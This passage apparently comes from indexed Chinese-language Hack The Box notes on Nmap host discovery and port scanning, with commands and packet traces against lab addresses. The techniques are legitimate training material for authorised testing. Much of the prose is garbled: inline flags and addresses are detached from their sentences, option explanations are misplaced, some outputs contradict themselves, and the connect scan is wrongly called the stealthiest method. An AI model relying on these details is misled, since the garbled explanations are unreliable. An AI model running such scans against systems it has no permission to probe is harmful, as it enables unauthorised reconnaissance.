\u8bf7\u6c42\u201d\u5bf9\u76ee\u6807\u6267\u884c ping \u626b\u63cf\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305 <p>\u53e6\u4e00\u79cd\u786e\u5b9a\u4e3a\u4ec0\u4e48 Nmap \u5c06\u6211\u4eec\u7684\u76ee\u6807\u6807\u8bb0\u4e3a\u201c\u6d3b\u52a8\u201d\u7684\u65b9\u6cd5\u662f\u4f7f\u7528\u201c <code>--reason</code>\u201d\u9009\u9879\u3002</p> <p>\u626b\u63cf\u7f51\u7edc\u8303\u56f4</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --reason \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:10 CEST\nSENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2\nRCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF\nNmap scan report for 10.129.2.18\nHost is up, received arp-response (0.028s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.03 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.18</code> \u9488\u5bf9\u76ee\u6807\u6267\u884c\u5b9a\u4e49\u7684\u626b\u63cf\u3002 <code>-sn</code> \u7981\u7528\u7aef\u53e3\u626b\u63cf\u3002 <code>-oA host</code> \u4ee5\u540d\u79f0\u201c\u4e3b\u673a\u201d\u5f00\u5934\u7684\u6240\u6709\u683c\u5f0f\u5b58\u50a8\u7ed3\u679c\u3002 <code>-PE</code> \u901a\u8fc7\u4f7f\u7528\u201cICMP Echo \u8bf7\u6c42\u201d\u5bf9\u76ee\u6807\u6267\u884c ping \u626b\u63cf\u3002 <code>--reason</code> \u663e\u793a\u7279\u5b9a\u7ed3\u679c\u7684\u539f\u56e0\u3002 <p>\u6211\u4eec\u5728\u8fd9\u91cc\u770b\u5230\u786e\u5b9e\u786e\u5b9e\u901a\u8fc7and\u5355\u72ec<code>Nmap</code>\u68c0\u6d4b\u4e86\u5bbf\u4e3b\u662f\u5426\u5b58\u6d3b\u3002\u8981\u7981\u7528 ARP \u8bf7\u6c42\u5e76\u4f7f\u7528\u6240\u9700\u7684\u626b\u63cf\u6211\u4eec\u7684\u76ee\u6807\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u201c \u201d\u9009\u9879\u6765\u7981\u7528 ARP ping\u3002\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u626b\u63cf\u6211\u4eec\u7684\u76ee\u6807\u5e76\u67e5\u770b\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002<code>ARP request``ARP reply``ICMP echo requests``--disable-arp-ping</code></p> <p>\u626b\u63cf\u7f51\u7edc\u8303\u56f4</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:12 CEST\nSENT (0.0107s) ICMP [10.10.14.2 &gt; 10.129.2.18 Echo request (type=8/code=0) id=13607 seq=0] IP [ttl=255 id=23541 iplen=28 ]\nRCVD (0.0152s) ICMP [10.129.2.18 &gt; 10.10.14.2 Echo reply (type=0/code=0) id=13607 seq=0] IP [ttl=128 id=40622 iplen=28 ]\nNmap scan report for 10.129.2.18\nHost is up (0.086s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.11 seconds\n</code></pre> <p>\u6211\u4eec\u5df2\u7ecf\u5728\u201c <code>Learning Process</code>\uff0c\u201d\u4e2d\u63d0\u5230\uff0c\u5728\u672c\u6a21\u5757\u7684\u5f00\u5934\uff0c\u6ce8\u610f\u7ec6\u8282\u662f\u5fc5\u4e0d\u53ef\u5c11\u7684\u3002\u4e00\u4e2a<code>ICMP echo request</code>\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u786e\u5b9a\u6211\u4eec\u7684\u76ee\u6807\u662f\u5426\u6d3b\u7740\u5e76\u8bc6\u522b\u5b83\u7684\u7cfb\u7edf\u3002\u6709\u5173\u4e3b\u673a\u53d1\u73b0\u7684\u66f4\u591a\u7b56\u7565\uff0c\u8bf7\u8bbf\u95ee\uff1a</p> <p>https://nmap.org/book/host-discovery-strategies.html</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_9","title":"\u4e3b\u673a\u548c\u7aef\u53e3\u626b\u63cf","text":"<p>\u5fc5\u987b\u4e86\u89e3\u6211\u4eec\u4f7f\u7528\u7684\u5de5\u5177\u5982\u4f55\u5de5\u4f5c\u4ee5\u53ca\u5b83\u5982\u4f55\u6267\u884c\u548c\u5904\u7406\u4e0d\u540c\u7684\u529f\u80fd\u3002\u53ea\u6709\u77e5\u9053\u7ed3\u679c\u7684\u542b\u4e49\u548c\u83b7\u5f97\u65b9\u5f0f\uff0c\u6211\u4eec\u624d\u80fd\u7406\u89e3\u7ed3\u679c\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5c06\u4ed4\u7ec6\u7814\u7a76\u548c\u5206\u6790\u4e00\u4e9b\u626b\u63cf\u65b9\u6cd5\u3002\u5728\u6211\u4eec\u53d1\u73b0\u6211\u4eec\u7684\u76ee\u6807\u662f\u6d3b\u7684\u4e4b\u540e\uff0c\u6211\u4eec\u60f3\u5f97\u5230\u4e00\u4e2a\u66f4\u51c6\u786e\u7684\u7cfb\u7edf\u56fe\u3002\u6211\u4eec\u9700\u8981\u7684\u4fe1\u606f\u5305\u62ec\uff1a</p> <ul> <li>\u5f00\u653e\u7aef\u53e3\u53ca\u5176\u670d\u52a1</li> <li>\u670d\u52a1\u7248\u672c</li> <li>\u670d\u52a1\u63d0\u4f9b\u7684\u4fe1\u606f</li> <li>\u64cd\u4f5c\u7cfb\u7edf</li> </ul> <p>\u5bf9\u4e8e\u4e00\u4e2a\u88ab\u626b\u63cf\u7684\u7aef\u53e3\uff0c\u6211\u4eec\u603b\u5171\u53ef\u4ee5\u83b7\u5f976\u79cd\u4e0d\u540c\u7684\u72b6\u6001\uff1a</p> \u72b6\u6001 \u63cf\u8ff0 <code>open</code> \u8fd9\u8868\u660e\u5df2\u5efa\u7acb\u4e0e\u626b\u63cf\u7aef\u53e3\u7684\u8fde\u63a5\u3002\u8fd9\u4e9b\u8fde\u63a5\u53ef\u4ee5\u662fTCP \u8fde\u63a5\u3001UDP \u6570\u636e\u62a5\u4ee5\u53caSCTP \u5173\u8054\u3002 <code>closed</code> \u5f53\u7aef\u53e3\u663e\u793a\u4e3a\u5173\u95ed\u65f6\uff0cTCP \u534f\u8bae\u8868\u660e\u6211\u4eec\u6536\u5230\u7684\u6570\u636e\u5305\u5305\u542b\u4e00\u4e2a<code>RST</code>\u6807\u5fd7\u3002\u8fd9\u79cd\u626b\u63cf\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u7528\u6765\u5224\u65ad\u6211\u4eec\u7684\u76ee\u6807\u662f\u5426\u8fd8\u6d3b\u7740\u3002 <code>filtered</code> Nmap \u65e0\u6cd5\u6b63\u786e\u8bc6\u522b\u626b\u63cf\u7684\u7aef\u53e3\u662f\u6253\u5f00\u8fd8\u662f\u5173\u95ed\uff0c\u56e0\u4e3a\u76ee\u6807\u6ca1\u6709\u4e3a\u8be5\u7aef\u53e3\u8fd4\u56de\u4efb\u4f55\u54cd\u5e94\uff0c\u6216\u8005\u6211\u4eec\u4ece\u76ee\u6807\u83b7\u5f97\u9519\u8bef\u4ee3\u7801\u3002 <code>unfiltered</code> \u7aef\u53e3\u7684\u8fd9\u79cd\u72b6\u6001\u53ea\u5728TCP-ACK\u626b\u63cf\u65f6\u51fa\u73b0\uff0c\u8868\u793a\u7aef\u53e3\u53ef\u4ee5\u8bbf\u95ee\uff0c\u4f46\u65e0\u6cd5\u5224\u65ad\u662fopen\u8fd8\u662fclosed\u3002 <code>open|filtered</code> \u5982\u679c\u6211\u4eec\u6ca1\u6709\u5f97\u5230\u7279\u5b9a\u7aef\u53e3\u7684\u54cd\u5e94\uff0c<code>Nmap</code>\u5c06\u628a\u5b83\u8bbe\u7f6e\u4e3a\u8be5\u72b6\u6001\u3002\u8fd9\u8868\u660e\u9632\u706b\u5899\u6216\u6570\u636e\u5305\u8fc7\u6ee4\u5668\u53ef\u80fd\u4f1a\u4fdd\u62a4\u8be5\u7aef\u53e3\u3002 <code>closed|filtered</code> \u8fd9\u79cd\u72b6\u6001\u53ea\u51fa\u73b0\u5728IP ID\u7a7a\u95f2\u626b\u63cf\u4e2d\uff0c\u8868\u793a\u65e0\u6cd5\u786e\u5b9a\u626b\u63cf\u7684\u7aef\u53e3\u662f\u5426\u88ab\u9632\u706b\u5899\u5173\u95ed\u6216\u8fc7\u6ee4\u3002"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#tcp","title":"\u53d1\u73b0\u5f00\u653e\u7684 TCP \u7aef\u53e3","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c<code>Nmap</code>\u4f7f\u7528 SYN \u626b\u63cf ( <code>-sS</code>) \u626b\u63cf\u524d 1000 \u4e2a TCP \u7aef\u53e3\u3002\u7531\u4e8e\u521b\u5efa\u539f\u59cb TCP \u6570\u636e\u5305\u9700\u8981\u5957\u63a5\u5b57\u6743\u9650\uff0c\u56e0\u6b64\u5f53\u6211\u4eec\u4ee5 root \u8eab\u4efd\u8fd0\u884c\u65f6\uff0c\u6b64 SYN \u626b\u63cf\u4ec5\u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u503c\u3002<code>-sT</code>\u5426\u5219\uff0c\u9ed8\u8ba4\u6267\u884cTCP \u626b\u63cf ( )\u3002\u8fd9\u610f\u5473\u7740\u5982\u679c\u6211\u4eec\u4e0d\u5b9a\u4e49\u7aef\u53e3\u548c\u626b\u63cf\u65b9\u6cd5\uff0c\u8fd9\u4e9b\u53c2\u6570\u4f1a\u81ea\u52a8\u8bbe\u7f6e\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u626b\u63cf\u6240\u6709\u7aef\u53e3 ( <code>-p 22,25,80,139,445</code>) \u4ee5\u53ca\u5b9a\u4e49\u5feb\u901f\u7aef\u53e3\u626b\u63cf\uff0c\u901a\u8fc7\u626b\u63cf\u6240\u6709\u7aef\u53e3 ( <code>-p 22-445</code>)<code>--top-ports=10</code>\u4ee5\u53ca\u5b9a\u4e49\u5feb\u901f\u7aef\u53e3\u626b\u63cf\uff0c\u5176\u4e2d\u5305\u542b\u9876\u7ea7100 \u4e2a\u7aef\u53e3 ( )\u3002<code>Nmap``-p-``-F</code></p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#10-tcp","title":"\u626b\u63cf\u524d 10 \u4e2a TCP \u7aef\u53e3","text":"<p>\u626b\u63cf\u524d 10 \u4e2a TCP \u7aef\u53e3</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 --top-ports=10 \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:36 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.021s latency).\n\nPORT     STATE    SERVICE\n21/tcp   closed   ftp\n22/tcp   open     ssh\n23/tcp   closed   telnet\n25/tcp   open     smtp\n80/tcp   open     http\n110/tcp  open     pop3\n139/tcp  filtered netbios-ssn\n443/tcp  closed   https\n445/tcp  filtered microsoft-ds\n3389/tcp closed   ms-wbt-server\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 1.44 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>--top-ports=10</code> \u626b\u63cf\u5df2\u5b9a\u4e49\u4e3a\u6700\u9891\u7e41\u7684\u6307\u5b9a\u9876\u7ea7\u7aef\u53e3\u3002 <p>\u6211\u4eec\u770b\u5230\u6211\u4eec\u53ea\u626b\u63cf\u4e86\u76ee\u6807\u7684\u524d 10 \u4e2a TCP \u7aef\u53e3\uff0c\u5e76<code>Nmap</code>\u76f8\u5e94\u5730\u663e\u793a\u5b83\u4eec\u7684\u72b6\u6001\u3002\u5982\u679c\u6211\u4eec\u8ddf\u8e2a<code>Nmap</code>\u53d1\u9001\u7684\u6570\u636e\u5305\uff0c\u6211\u4eec\u5c06\u770b\u5230\u76ee\u6807\u53d1\u9001\u56de\u7ed9\u6211\u4eec\u7684<code>RST</code>\u6807\u5fd7\u3002<code>TCP port 21</code>\u4e3a\u4e86\u6e05\u695a\u5730\u4e86\u89e3 SYN \u626b\u63cf\uff0c\u6211\u4eec\u7981\u7528 ICMP \u56de\u663e\u8bf7\u6c42 ( <code>-Pn</code>)\u3001DNS \u89e3\u6790 ( <code>-n</code>) \u548c ARP ping \u626b\u63cf ( <code>--disable-arp-ping</code>)\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap-","title":"Nmap - \u8ddf\u8e2a\u6570\u636e\u5305","text":"<p>Nmap - \u8ddf\u8e2a\u6570\u636e\u5305</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:39 CEST\nSENT (0.0429s) TCP 10.10.14.2:63090 &gt; 10.129.2.28:21 S ttl=56 id=57322 iplen=44  seq=1699105818 win=1024 &lt;mss 1460&gt;\nRCVD (0.0573s) TCP 10.129.2.28:21 &gt; 10.10.14.2:63090 RA ttl=64 id=0 iplen=40  seq=0 win=0\nNmap scan report for 10.11.1.28\nHost is up (0.014s latency).\n\nPORT   STATE  SERVICE\n21/tcp closed ftp\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.07 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 21</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <p>\u4ece SENT \u884c\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec ( )\u5411\u6211\u4eec\u7684\u76ee\u6807 ( )<code>10.10.14.2</code>\u53d1\u9001\u4e86\u4e00\u4e2a\u5e26\u6709<code>SYN</code>\u6807\u5fd7 ( ) \u7684 TCP \u6570\u636e\u5305\u3002\u5728\u4e0b\u4e00\u4e2a RCVD \u884c\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u76ee\u6807\u4f7f\u7528\u5305\u542b\u548c\u6807\u5fd7 ( ) \u7684 TCP \u6570\u636e\u5305\u8fdb\u884c\u54cd\u5e94\u3002\u548c\u6807\u5fd7\u7528\u4e8e\u786e\u8ba4\u6536\u5230 TCP \u6570\u636e\u5305 ( ) \u548c\u7ed3\u675f TCP \u4f1a\u8bdd ( )\u3002<code>S``10.129.2.28``RST``ACK``RA``RST``ACK``ACK``RST</code></p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_10","title":"\u8bf7\u6c42","text":"\u4fe1\u606f \u63cf\u8ff0 <code>SENT (0.0429s)</code> \u8868\u793aNmap\u7684SENT\u64cd\u4f5c\uff0c\u5411\u76ee\u6807\u53d1\u9001\u6570\u636e\u5305\u3002 <code>TCP</code> \u663e\u793a\u7528\u4e8e\u4e0e\u76ee\u6807\u7aef\u53e3\u4ea4\u4e92\u7684\u534f\u8bae\u3002 <code>10.10.14.2:63090 &gt;</code> \u8868\u793a\u6211\u4eec\u7684 IPv4 \u5730\u5740\u548c\u6e90\u7aef\u53e3\uff0cNmap \u5c06\u4f7f\u7528\u5b83\u4eec\u6765\u53d1\u9001\u6570\u636e\u5305\u3002 <code>10.129.2.28:21</code> \u663e\u793a\u76ee\u6807 IPv4 \u5730\u5740\u548c\u76ee\u6807\u7aef\u53e3\u3002 <code>S</code> \u53d1\u9001\u7684 TCP \u6570\u636e\u5305\u7684 SYN \u6807\u5fd7\u3002 <code>ttl=56 id=57322 iplen=44 seq=1699105818 win=1024 mss 1460</code> \u9644\u52a0\u7684 TCP \u6807\u5934\u53c2\u6570\u3002"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_11","title":"\u54cd\u5e94","text":"\u4fe1\u606f \u63cf\u8ff0 <code>RCVD (0.0573s)</code> \u6307\u793a\u4ece\u76ee\u6807\u63a5\u6536\u5230\u7684\u6570\u636e\u5305\u3002 <code>TCP</code> \u663e\u793a\u6b63\u5728\u4f7f\u7528\u7684\u534f\u8bae\u3002 <code>10.129.2.28:21 &gt;</code> \u8868\u793a\u76ee\u6807 IPv4 \u5730\u5740\u548c\u6e90\u7aef\u53e3\uff0c\u5c06\u7528\u4e8e\u56de\u590d\u3002 <code>10.10.14.2:63090</code> \u663e\u793a\u6211\u4eec\u7684 IPv4 \u5730\u5740\u548c\u5c06\u56de\u590d\u7684\u7aef\u53e3\u3002 <code>RA</code> \u53d1\u9001\u7684 TCP \u6570\u636e\u5305\u7684 RST \u548c ACK \u6807\u5fd7\u3002 <code>ttl=64 id=0 iplen=40 seq=0 win=0</code> \u9644\u52a0\u7684 TCP \u6807\u5934\u53c2\u6570\u3002"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_12","title":"\u8fde\u63a5\u626b\u63cf","text":"<p>Nmap TCP \u8fde\u63a5\u626b\u63cf( <code>-sT</code>) \u4f7f\u7528 TCP \u4e09\u5411\u63e1\u624b\u6765\u786e\u5b9a\u76ee\u6807\u4e3b\u673a\u4e0a\u7684\u7279\u5b9a\u7aef\u53e3\u662f\u6253\u5f00\u8fd8\u662f\u5173\u95ed\u3002\u626b\u63cf<code>SYN</code>\u5411\u76ee\u6807\u7aef\u53e3\u53d1\u9001\u6570\u636e\u5305\u5e76\u7b49\u5f85\u54cd\u5e94\u3002\u5982\u679c\u76ee\u6807\u7aef\u53e3\u4ee5<code>SYN-ACK</code>\u6570\u636e\u5305\u54cd\u5e94\uff0c\u5219\u8ba4\u4e3a\u5b83\u662f\u6253\u5f00\u7684\uff1b\u5982\u679c\u5b83\u4ee5<code>RST</code>\u6570\u636e\u5305\u54cd\u5e94\uff0c\u5219\u8ba4\u4e3a\u5b83\u662f\u5173\u95ed\u7684\u3002</p> <p>\u626b\u63cf<code>Connect</code>\u5f88\u6709\u7528\uff0c\u56e0\u4e3a\u5b83\u662f\u786e\u5b9a\u7aef\u53e3\u72b6\u6001\u7684\u6700\u51c6\u786e\u65b9\u6cd5\uff0c\u4e5f\u662f\u6700\u9690\u79d8\u7684\u65b9\u6cd5\u3002\u4e0e SYN \u626b\u63cf\u7b49\u5176\u4ed6\u7c7b\u578b\u7684\u626b\u63cf\u4e0d\u540c\uff0cConnect \u626b\u63cf\u4e0d\u4f1a\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u7559\u4e0b\u4efb\u4f55\u672a\u5b8c\u6210\u7684\u8fde\u63a5\u6216\u672a\u53d1\u9001\u7684\u6570\u636e\u5305\uff0c\u8fd9\u4f7f\u5f97\u5b83\u4e0d\u592a\u53ef\u80fd\u88ab\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf (IDS) \u6216\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf (IPS) \u68c0\u6d4b\u5230). \u5f53\u6211\u4eec\u60f3\u8981\u6620\u5c04\u7f51\u7edc\u5e76\u4e14\u4e0d\u60f3\u5e72\u6270\u5176\u80cc\u540e\u8fd0\u884c\u7684\u670d\u52a1\u65f6\uff0c\u5b83\u5f88\u6709\u7528\uff0c\u56e0\u6b64\u9020\u6210\u7684\u5f71\u54cd\u6700\u5c0f\uff0c\u6709\u65f6\u88ab\u8ba4\u4e3a\u662f\u4e00\u79cd\u66f4\u793c\u8c8c\u7684\u626b\u63cf\u65b9\u6cd5\u3002</p> <p>\u5f53\u76ee\u6807\u4e3b\u673a\u5177\u6709\u4e22\u5f03\u4f20\u5165\u6570\u636e\u5305\u4f46\u5141\u8bb8\u4f20\u51fa\u6570\u636e\u5305\u7684\u4e2a\u4eba\u9632\u706b\u5899\u65f6\uff0c\u5b83\u4e5f\u5f88\u6709\u7528\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8fde\u63a5\u626b\u63cf\u53ef\u4ee5\u7ed5\u8fc7\u9632\u706b\u5899\u5e76\u51c6\u786e\u786e\u5b9a\u76ee\u6807\u7aef\u53e3\u7684\u72b6\u6001\u3002\u4f46\u662f\uff0c\u8bf7\u52a1\u5fc5\u6ce8\u610f\uff0c\u8fde\u63a5\u626b\u63cf\u6bd4\u5176\u4ed6\u7c7b\u578b\u7684\u626b\u63cf\u6162\uff0c\u56e0\u4e3a\u5b83\u8981\u6c42\u626b\u63cf\u5668\u5728\u53d1\u9001\u6bcf\u4e2a\u6570\u636e\u5305\u540e\u7b49\u5f85\u76ee\u6807\u7684\u54cd\u5e94\uff0c\u5982\u679c\u76ee\u6807\u7e41\u5fd9\u6216\u65e0\u54cd\u5e94\uff0c\u8fd9\u53ef\u80fd\u9700\u8981\u4e00\u4e9b\u65f6\u95f4\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#tcp-443","title":"\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf","text":"<p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:26 CET\nCONN (0.0385s) TCP localhost &gt; 10.129.2.28:443 =&gt; Operation now in progress\nCONN (0.0396s) TCP localhost &gt; 10.129.2.28:443 =&gt; Connected\nNmap scan report for 10.129.2.28\nHost is up, received user-set (0.013s latency).\n\nPORT    STATE SERVICE REASON\n443/tcp open  https   syn-ack\n\nNmap done: 1 IP address (1 host up) scanned in 0.04 seconds\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_13","title":"\u8fc7\u6ee4\u7aef\u53e3","text":"<p>\u5f53\u7aef\u53e3\u663e\u793a\u4e3a\u5df2\u8fc7\u6ee4\u65f6\uff0c\u53ef\u80fd\u6709\u591a\u79cd\u539f\u56e0\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u9632\u706b\u5899\u8bbe\u7f6e\u4e86\u7279\u5b9a\u7684\u89c4\u5219\u6765\u5904\u7406\u7279\u5b9a\u7684\u8fde\u63a5\u3002\u6570\u636e\u5305\u53ef\u4ee5\u662f<code>dropped</code>, \u6216<code>rejected</code>\u3002\u5f53\u4e00\u4e2a\u6570\u636e\u5305\u88ab\u4e22\u5f03\uff0c<code>Nmap</code>\u6ca1\u6709\u6536\u5230\u6765\u81ea\u6211\u4eec\u76ee\u6807\u7684\u54cd\u5e94\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u91cd\u8bd5\u7387 ( <code>--max-retries</code>) \u8bbe\u7f6e\u4e3a 1\u3002\u8fd9\u610f\u5473\u7740<code>Nmap</code>\u5c06\u91cd\u65b0\u53d1\u9001\u8bf7\u6c42\u5230\u76ee\u6807\u7aef\u53e3\uff0c\u4ee5\u786e\u5b9a\u524d\u4e00\u4e2a\u6570\u636e\u5305\u662f\u5426\u88ab\u610f\u5916\u9519\u8bef\u5904\u7406\u3002</p> <p>\u8ba9\u6211\u4eec\u770b\u4e00\u4e2a\u793a\u4f8b\uff0c\u5176\u4e2d\u9632\u706b\u5899<code>drops</code>\u5bf9\u6211\u4eec\u53d1\u9001\u7684 TCP \u6570\u636e\u5305\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\u3002\u56e0\u6b64\u6211\u4eec\u626b\u63cf TCP \u7aef\u53e3139\uff0c\u5b83\u5df2\u7ecf\u663e\u793a\u4e3a\u5df2\u8fc7\u6ee4\u3002\u4e3a\u4e86\u80fd\u591f\u8ddf\u8e2a\u6211\u4eec\u53d1\u9001\u7684\u6570\u636e\u5305\u662f\u5982\u4f55\u5904\u7406\u7684\uff0c\u6211\u4eec\u518d\u6b21\u505c\u7528 ICMP \u56de\u663e\u8bf7\u6c42 ( <code>-Pn</code>)\u3001DNS \u89e3\u6790 ( <code>-n</code>) \u548c ARP ping \u626b\u63cf ( )\u3002<code>--disable-arp-ping</code></p> <p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -Pn\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:45 CEST\nSENT (0.0381s) TCP 10.10.14.2:60277 &gt; 10.129.2.28:139 S ttl=47 id=14523 iplen=44  seq=4175236769 win=1024 &lt;mss 1460&gt;\nSENT (1.0411s) TCP 10.10.14.2:60278 &gt; 10.129.2.28:139 S ttl=45 id=7372 iplen=44  seq=4175171232 win=1024 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up.\n\nPORT    STATE    SERVICE\n139/tcp filtered netbios-ssn\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 2.06 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 139</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <p>\u6211\u4eec\u5728\u4e0a\u6b21\u626b\u63cf\u4e2d\u770b\u5230<code>Nmap</code>\u53d1\u9001\u4e86\u4e24\u4e2a\u5e26\u6709 SYN \u6807\u5fd7\u7684 TCP \u6570\u636e\u5305\u3002<code>2.06s</code>\u901a\u8fc7\u626b\u63cf\u7684\u6301\u7eed\u65f6\u95f4 ( )\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u5b83\u82b1\u8d39\u7684\u65f6\u95f4\u6bd4\u4e4b\u524d\u7684 ( <code>~0.05s</code>) \u957f\u5f97\u591a\u3002\u5982\u679c\u9632\u706b\u5899\u62d2\u7edd\u6570\u636e\u5305\uff0c\u60c5\u51b5\u5c31\u4e0d\u540c\u4e86\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u67e5\u770b TCP \u7aef\u53e3<code>445</code>\uff0c\u5b83\u7531\u9632\u706b\u5899\u7684\u6b64\u7c7b\u89c4\u5219\u76f8\u5e94\u5730\u5904\u7406\u3002</p> <p>\u5728 TCP \u7aef\u53e3 443 \u4e0a\u8fdb\u884c\u8fde\u63a5\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 445 --packet-trace -n --disable-arp-ping -Pn\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:55 CEST\nSENT (0.0388s) TCP 10.129.2.28:52472 &gt; 10.129.2.28:445 S ttl=49 id=21763 iplen=44  seq=1418633433 win=1024 &lt;mss 1460&gt;\nRCVD (0.0487s) ICMP [10.129.2.28 &gt; 10.129.2.28 Port 445 unreachable (type=3/code=3) ] IP [ttl=64 id=20998 iplen=72 ]\nNmap scan report for 10.129.2.28\nHost is up (0.0099s latency).\n\nPORT    STATE    SERVICE\n445/tcp filtered microsoft-ds\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.05 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 445</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--packet-trace</code> 